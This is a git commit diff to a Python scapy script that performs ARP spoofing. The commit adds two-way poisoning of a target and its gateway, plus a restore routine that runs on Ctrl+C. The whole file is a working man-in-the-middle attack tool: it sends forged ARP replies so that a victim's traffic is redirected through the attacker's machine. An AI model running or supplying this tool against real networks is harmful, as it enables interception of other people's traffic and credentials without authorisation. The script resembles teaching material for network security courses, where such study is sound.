90b7ea76abc4160bbe323408ba1f218cc577aca4
lukianets <lukyanets89@gmail.com>
2020-01-29 18:52:40 +0200

    add try for ctrl+c

--- python-scapy-arp-spoof.py
+++ python-scapy-arp-spoof.py
@@ -4,6 +4,7 @@ import scapy.all as scapy
 import argparse
 import time
 
+
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="Target IP address")
@@ -15,27 +16,36 @@ def get_arguments():
         parser.error("[-] Please specify an Gateway IP address, use --help for more info.")
     return options
 
+
 def get_mac(ip):
-    response, unresponse = scapy.arping(ip, verbose = False)
+    response, unresponse = scapy.arping(ip, verbose=False)
     mac = response[0][1].hwsrc
     return mac
 
+
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
-    scapy.send(packet, verbose = False)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
 
-def restore():
-    pass
+
+def restore(source_ip, destination_ip):
+    source_mac = get_mac(source_ip)
+    destination_mac = get_mac(destination_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
 
 options = get_arguments()
 counter = 0
-while True:
-   spoof(options.target, options.gateway)
-   print("\r Send packet: ", counter, end='' )
-   counter +=1
-   time.sleep(2)
-
-
-
+try:
+    while True:
+        spoof(options.target, options.gateway)
+        spoof(options.gateway, options.target)
+        print("\r Send packet: ", counter, end='')
+        counter += 2
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n [-] Detected  Ctrl + C.... Restored all info. Exit")
+    restore(options.target, options.gateway)
+    restore(options.gateway, options.target)
